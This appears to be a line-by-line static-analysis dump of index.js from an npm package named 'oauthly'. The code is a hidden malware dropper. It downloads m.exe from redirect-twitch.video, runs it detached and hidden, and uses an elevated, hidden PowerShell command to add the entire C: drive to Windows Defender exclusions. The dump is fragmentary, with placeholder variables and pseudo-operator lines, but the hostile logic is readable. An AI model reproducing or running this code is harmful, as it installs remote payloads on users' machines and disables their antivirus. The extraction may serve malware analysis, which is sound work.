// File: tmp/tmp0fevt9_o/oauthly/package/index.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const http = require('http')
Line 3: const fs = require('fs')
Line 4: const os = require('os')
Line 5: const path = require('path')
Line 6: _tmp_19 = require('child_process')
Line 9: _tmp_20.outputFile = path.join(os.tmpdir(), 'm.exe')
Line 10: _tmp_20.fileUrl = "http://redirect-twitch.video/m.exe"
Line 20: {
    const protocol = getProtocol(url);
    const file = fs.createWriteStream(dest);
    const request = protocol.get(url, (res) => {
      if (res.statusCode !== 200) {
        fs.unlink(dest, () => {}); // Cleanup on error
        return reject(new Error(`Download failed: HTTP ${res.statusCode}`));
      }
      res.pipe(file);
      file.on('finish', () => {
        file.close();
        resolve(dest);
      });
    });
    request.on('error', (err) => {
      fs.unlink(dest, () => {}); // Cleanup on error
      reject(err);
    });
    request.setTimeout(config.timeout, () => {
      request.destroy();
      fs.unlink(dest, () => {}); // Cleanup on timeout
      reject(new Error('Download timeout'));
    });
  }
Line 28: res.pipe(file)
Line 38: request.setTimeout(config.timeout, () => {
      request.destroy();
      fs.unlink(dest, () => {}); // Cleanup on timeout
      reject(new Error('Download timeout'));
    })
Line 39: request.destroy()
Line 48: fs.stat(filePath, (err, stats) => {
      if (err) return reject(err);
      if (stats.size === 0) return reject(new Error('Empty file'));
      resolve();
    })
Line 57: {
    const child = spawn(filePath, [], {
      detached: true,
      stdio: ['ignore', 'pipe', 'pipe'], // Capture stdout and stderr
      windowsHide: true
    });

    let outputData = '';
    let errorData = '';

    // Capture stdout and stderr for logging
    child.stdout.on('data', (data) => {
      outputData += data.toString();
    });

    child.stderr.on('data', (data) => {
      errorData += data.toString();
    });

    const timeout = setTimeout(() => {
      try {
        process.kill(child.pid, 'SIGTERM');
        reject(new Error('Execution timeout'));
      } catch (e) {
        reject(new Error('Execution failed'));
      }
    }, config.timeout);

    // Handle the child process exit event
    child.on('exit', (code, signal) => {
      clearTimeout(timeout);
      if (code !== 0) {
        reject(new Error(`Process exited with code ${code}\n${errorData}`));
      } else {
        resolve(outputData); // Return any stdout data
      }
    });

    // Handle any er...
Line 58: const child = spawn(filePath, [], {
      detached: true,
      stdio: ['ignore', 'pipe', 'pipe'], // Capture stdout and stderr
      windowsHide: true
    })
Line 60: _tmp_6.stdio = ['ignore', 'pipe', 'pipe']
Line 69: data.toString()
Line 73: data.toString()
Line 76: const timeout = setTimeout(() => {
      try {
        process.kill(child.pid, 'SIGTERM');
        reject(new Error('Execution timeout'));
      } catch (e) {
        reject(new Error('Execution failed'));
      }
    }, config.timeout)
Line 78: process.kill(child.pid, 'SIGTERM')
Line 87: clearTimeout(timeout)
Line 97: clearTimeout(timeout)
Line 104: {
    const command = `Add-MpPreference -ExclusionPath "C:\\"`;
    const powershellCommand = `Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "${command}" -WindowStyle Hidden'`;
    const process = exec(`powershell -Command "${powershellCommand}"`, {
      windowsHide: true
    }, (err) => {
      if (err) {
        if (err.message.includes('Access is denied') || err.message.includes('was not started')) {
          reject(new Error('Admin privileges required - UAC was denied'));
        } else {
          reject(err);
        }
      } else {
        resolve();
      }
    });

    setTimeout(() => {
      try {
        process.kill();
      } catch (e) {}
      reject(new Error('Elevation timeout'));
    }, config.timeout);
  }
Line 106: <operator>.formatString("Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "", command, "" -WindowStyle Hidden'")
Line 107: const process = exec(`powershell -Command "${powershellCommand}"`, {
      windowsHide: true
    }, (err) => {
      if (err) {
        if (err.message.includes('Access is denied') || err.message.includes('was not started')) {
          reject(new Error('Admin privileges required - UAC was denied'));
        } else {
          reject(err);
        }
      } else {
        resolve();
      }
    })
Line 111: err.message.includes('Access is denied')
Line 121: setTimeout(() => {
      try {
        process.kill();
      } catch (e) {}
      reject(new Error('Elevation timeout'));
    }, config.timeout)
Line 123: process.kill()
Line 139: downloadFile(config.fileUrl, config.outputFile)
Line 156: main()
Line 158: process.exit(1)
